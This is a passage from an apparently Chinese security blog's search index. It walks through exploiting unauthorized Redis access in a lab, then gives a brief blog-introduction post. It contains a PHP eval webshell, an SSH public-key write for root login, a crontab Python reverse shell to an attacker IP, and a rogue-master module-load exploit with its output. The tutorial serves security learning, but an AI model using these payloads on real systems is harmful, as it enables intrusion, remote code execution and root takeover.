class="hljs-variable">$fp</span>=fopen(<span class="hljs-string">&#x27;mocha.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>);<br>fwrite(<span class="hljs-variable">$fp</span>,<span class="hljs-string">&#x27;&lt;?php @eval($_POST[\&quot;mocha\&quot;]);?&gt;&#x27;</span>);<br><span class="hljs-built_in">exit</span>();<br>?&gt;<br></code></pre></td></tr></table></figure><h4 id="4-2-利用“公私钥”认证获取root权限"><a href="#4-2-利用“公私钥”认证获取root权限" class="headerlink" title="4.2 利用“公私钥”认证获取root权限"></a>4.2 利用“公私钥”认证获取root权限</h4><p>当redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录目标服务器。<br />靶机中开启redis服务：redis-server &#x2F;etc&#x2F;redis.conf<br />在靶机中执行  mkdir &#x2F;root&#x2F;.ssh  命令，创建ssh公钥存放目录（靶机是作为ssh服务器使用的）<br />在攻击机中生成ssh公钥和私钥，密码设置为空：<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis8.png"><br />进入.ssh目录：cd .ssh&#x2F;，将生成的公钥保存到1.txt：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">(<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>; <span class="hljs-built_in">cat</span> id_rsa.pub; <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>) &gt; 1.txt<br></code></pre></td></tr></table></figure><p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/9.png"><br />链接靶机上的redis服务，<br />将保存ssh的公钥1.txt写入redis（使用redis-cli -h ip命令连接靶机，将文件写入)：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> 1.txt | redis-cli -h 192.168.0.110 -x <span class="hljs-built_in">set</span> crack<br></code></pre></td></tr></table></figure><p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/10.png"></p><p><br />远程登录靶机的redis服务：redis-cli -h 192.168.0.104 <br />并使用 CONFIG GET dir 命令得到redis备份的路径：<br />更改redis备份路径为ssh公钥存放目录（一般默认为&#x2F;root&#x2F;.ssh)<br />设置上传公钥的备份文件名字为authorized_keys：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">config get <span class="hljs-built_in">dir</span><br>config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /root/.ssh<br>config <span class="hljs-built_in">set</span> dbfilename authorized_keys<br></code></pre></td></tr></table></figure><p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/11.png"></p><p><br />检查是否更改成功（查看有没有authorized_keys文件)，没有问题就保存然后退出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">config get dbfilename<br></code></pre></td></tr></table></figure><p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/12.png"><br />至此成功写入ssh公钥到靶机<br />在攻击机上使用ssh免密登录靶机：ssh -i id_rsa <a href="mailto:&#x72;&#x6f;&#x6f;&#x74;&#64;&#x31;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#48;&#x2e;&#x31;&#x31;&#x30;">&#x72;&#x6f;&#x6f;&#x74;&#64;&#x31;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#48;&#x2e;&#x31;&#x31;&#x30;</a><br />成功登录<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/13.png"></p><h4 id="4-3-利用Crontab反弹shell"><a href="#4-3-利用Crontab反弹shell" class="headerlink" title="4.3 利用Crontab反弹shell"></a>4.3 利用Crontab反弹shell</h4><p>在<strong>权限足够的情况</strong>下，利用redis写入文件到计划任务目录下执行。</p><p>在攻击者服务器上监听一个端口（未被占用的任意端口）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvnp 7777<br></code></pre></td></tr></table></figure><ul><li>攻击步骤</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">redis-cli -h 192.168.0.110<br><br><span class="hljs-built_in">set</span> xxx  <span class="hljs-string">&quot;\n* * * * * /usr/bin/python -c &#x27;import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;192.168.0.111\&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#x27;\n&quot;</span><br><br><br><br>config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /var/spool/cron<br><br>config <span class="hljs-built_in">set</span> dbfilename root<br><br>save<br></code></pre></td></tr></table></figure><p><br /> <img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/14.png"><br /> <br />登陆ubuntu查看计划任务，已经成功写入。但是发现计划中存在乱码，也就是这些乱码导致计划任务执行错误。<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/15.png"></p><p>这是由于redis向任务计划文件里写内容出现乱码而导致的语法错误，而乱码是避免不了的，centos会忽略乱码去执行格式正确的任务计划，而ubuntu并不会忽略这些乱码，所以导致命令执行失败，<br />因为自己如果不使用redis写任务计划文件，而是正常向&#x2F;etc&#x2F;cron.d目录下写任务计划文件的话，命令是可以正常执行的，所以还是乱码的原因导致命令不能正常执行，而这个问题是不能解决的，因为利用redis未授权访问写的任务计划文件里都有乱码，这些代码来自redis的缓存数据。</p><p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/16.png"></p><ul><li><strong>解决办法（未完待续）</strong></li></ul><p>发现ubantu下默认使用&#x2F;bin&#x2F;dash执行脚本的问题，解决方式:将shell环境修改为bash。<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/17.png"></p><h4 id="4-4-通过主从复制-GetShell"><a href="#4-4-通过主从复制-GetShell" class="headerlink" title="4.4 通过主从复制 GetShell"></a>4.4 通过主从复制 GetShell</h4><h5 id="4-4-1-redis主从复制"><a href="#4-4-1-redis主从复制" class="headerlink" title="4.4.1 redis主从复制"></a>4.4.1 redis主从复制</h5><p>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p><p>这里我们开两台docker来做测试</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ubuntu</span>@VM-<span class="hljs-number">1</span>-<span class="hljs-number">7</span>-ubuntu:~/lorexxar$ sudo docker ps<br><span class="hljs-attribute">CONTAINER</span> ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                    NAMES<br><span class="hljs-attribute">3fdb2479af9c</span>        redis:<span class="hljs-number">5</span>.<span class="hljs-number">0</span>           <span class="hljs-string">&quot;docker-entrypoint.s…&quot;</span>   <span class="hljs-number">22</span> hours ago        Up <span class="hljs-number">4</span> seconds        <span class="hljs-number">0.0.0.0:6380</span>-&gt;<span class="hljs-number">6379</span>/tcp   epic_khorana<br><span class="hljs-attribute">3e313c7498c2</span>        redis:<span class="hljs-number">5</span>.<span class="hljs-number">0</span>           <span class="hljs-string">&quot;docker-entrypoint.s…&quot;</span>   <span class="hljs-number">23</span> hours ago        Up <span class="hljs-number">23</span> hours         <span class="hljs-number">0.0.0.0:6379</span>-&gt;<span class="hljs-number">6379</span>/tcp   vibrant_hodgkin<br></code></pre></td></tr></table></figure><p>然后通过slaveof可以设置主从状态</p><p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/18.png"><br />这样一来数据就会自动同步了</p><h5 id="4-4-2-redis模块"><a href="#4-4-2-redis模块" class="headerlink" title="4.4.2 redis模块"></a>4.4.2 redis模块</h5><p>在了解了主从同步之后，我们还需要对redis的模块有所了解。<br />在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。<br />编写恶意so文件的代码<br /><a href="https://github.com/RicterZ/RedisModules-ExecuteCommand">https://github.com/RicterZ/RedisModules-ExecuteCommand</a></p><h5 id="4-4-3-利用原理"><a href="#4-4-3-利用原理" class="headerlink" title="4.4.3 利用原理"></a>4.4.3 利用原理</h5><p>Pavel Toporkov在2018年的zeronights会议上，分享了关于这个漏洞的详细原理。<br /><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a></p><p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/19.png"></p><h5 id="4-4-4-复现过程"><a href="#4-4-4-复现过程" class="headerlink" title="4.4.4 复现过程"></a>4.4.4 复现过程</h5><p>选择使用模拟的恶意服务端来作为主机，并模拟fullresync请求。</p><ul><li>第一个脚本</li></ul><p><a href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a><br />然后直接通过脚本来攻击服务端</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">──(root💀kali)-[~/mytools/new/redis-rogue-getshell]<br>└─# ./redis-master.py -r 192.168.0.110 -p 6379 -L 192.168.0.111 -P 8888 -f RedisModulesSDK/exp.so -c &quot;id&quot;<br>&gt;&gt; send data: b&#x27;*3\r<span class="hljs-symbol">\n</span>$7\r<span class="hljs-symbol">\n</span>SLAVEOF\r<span class="hljs-symbol">\n</span>$13\r<span class="hljs-symbol">\n</span>192.168.0.111\r<span class="hljs-symbol">\n</span>$4\r<span class="hljs-symbol">\n</span>8888\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;+OK\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; send data: b&#x27;*4\r<span class="hljs-symbol">\n</span>$6\r<span class="hljs-symbol">\n</span>CONFIG\r<span class="hljs-symbol">\n</span>$3\r<span class="hljs-symbol">\n</span>SET\r<span class="hljs-symbol">\n</span>$10\r<span class="hljs-symbol">\n</span>dbfilename\r<span class="hljs-symbol">\n</span>$6\r<span class="hljs-symbol">\n</span>exp.so\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;+OK\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;PING\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;REPLCONF listening-port 6379\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;REPLCONF capa eof capa psync2\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;PSYNC af12f81deb86c2f8397ae9077ea01eea50e506c1 1\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; send data: b&#x27;*3\r<span class="hljs-symbol">\n</span>$6\r<span class="hljs-symbol">\n</span>MODULE\r<span class="hljs-symbol">\n</span>$4\r<span class="hljs-symbol">\n</span>LOAD\r<span class="hljs-symbol">\n</span>$8\r<span class="hljs-symbol">\n</span>./exp.so\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;+OK\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; send data: b&#x27;*3\r<span class="hljs-symbol">\n</span>$7\r<span class="hljs-symbol">\n</span>SLAVEOF\r<span class="hljs-symbol">\n</span>$2\r<span class="hljs-symbol">\n</span>NO\r<span class="hljs-symbol">\n</span>$3\r<span class="hljs-symbol">\n</span>ONE\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;+OK\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; send data: b&#x27;*4\r<span class="hljs-symbol">\n</span>$6\r<span class="hljs-symbol">\n</span>CONFIG\r<span class="hljs-symbol">\n</span>$3\r<span class="hljs-symbol">\n</span>SET\r<span class="hljs-symbol">\n</span>$10\r<span class="hljs-symbol">\n</span>dbfilename\r<span class="hljs-symbol">\n</span>$8\r<span class="hljs-symbol">\n</span>dump.rdb\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;+OK\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; send data: b&#x27;*2\r<span class="hljs-symbol">\n</span>$11\r<span class="hljs-symbol">\n</span>system.exec\r<span class="hljs-symbol">\n</span>$2\r<span class="hljs-symbol">\n</span>id\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;$49\r<span class="hljs-symbol">\n</span>euid=999(redis) gid=999(redis) groups=999(redis)<span class="hljs-symbol">\n</span>\r<span class="hljs-symbol">\n</span>&#x27;<br>euid=999(redis) gid=999(redis) groups=999(redis)<br><br>&gt;&gt; send data: b&#x27;*3\r<span class="hljs-symbol">\n</span>$6\r<span class="hljs-symbol">\n</span>MODULE\r<span class="hljs-symbol">\n</span>$6\r<span class="hljs-symbol">\n</span>UNLOAD\r<span class="hljs-symbol">\n</span>$6\r<span class="hljs-symbol">\n</span>system\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;+OK\r<span class="hljs-symbol">\n</span>&#x27;<br></code></pre></td></tr></table></figure><ul><li>第二个脚本</li></ul><p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a><br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/20.png"></p><h2 id="三、参考"><a href="#三、参考" class="headerlink" title="三、参考"></a>三、参考</h2><p><a href="https://lorexxar.cn/2019/07/10/redis-5-x-rce/">https://lorexxar.cn/2019/07/10/redis-5-x-rce/</a><br /><a href="https://github.com/vulhub/vulhub/tree/master/redis/4-unacc">https://github.com/vulhub/vulhub/tree/master/redis/4-unacc</a><br /><a href="https://www.cnblogs.com/websec80/articles/14734623.html">https://www.cnblogs.com/websec80/articles/14734623.html</a><br /><a href="https://www.cnblogs.com/bmjoker/p/9548962.html">https://www.cnblogs.com/bmjoker/p/9548962.html</a><br /><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a><br /><a href="https://blog.xray.cool/post/learning-redis-security">https://blog.xray.cool/post/learning-redis-security</a></p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>redis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>开端</title>
    <link href="/2023/04/20/%E5%BC%80%E7%AB%AF/"/>
    <url>/2023/04/20/%E5%BC%80%E7%AB%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="Hello-blog"><a href="#Hello-blog" class="headerlink" title="Hello blog"></a>Hello blog</h1><p>很早之前就想搭建一个博客，写一点东西，后续博客更新内容如下：</p><ul><li>网络安全</li><li>渗透测试</li><li>甲方安全</li><li>代码</li><li>杂谈</li><li>日常生活</li></ul><p>后续随缘更新…..</p>]]></content>
    
    
    
    <tags>
      
      <tag>杂谈</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
